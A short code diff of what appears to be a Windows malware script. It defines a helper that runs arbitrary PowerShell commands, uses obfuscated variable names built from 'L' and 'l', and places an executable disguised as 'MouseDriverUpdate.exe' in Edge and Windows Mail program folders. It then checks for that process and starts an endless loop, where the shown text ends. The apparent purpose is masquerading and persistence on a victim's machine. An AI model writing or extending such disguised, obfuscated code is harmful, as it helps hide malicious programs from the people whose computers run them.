@@ -6,7 +6,7 @@ def power_run(cmd):
     completed = subprocess.run(["powershell", "-Command", cmd], capture_output=False, close_fds=True)
     return completed
 
-LLLLLLLLllllllllllllllllLLllll= "C:\Program Files (x86)\Microsoft\Edge\MouseDriverUpdate.exe"
+LLLLLLLLllllllllllllllllLLllll= "C:\Program Files (x86)\MouseDriverUpdate.exe"
 LLLLLLLLllllllllllllllllLLlllll = "Get-Process -Name MouseDriverUpdate > Processes.txt"
 LLLLLLLLllllllllllllllLLlllllll = "C:\Program Files\Windows Mail\MouseDriverUpdate.exe"
 while True:
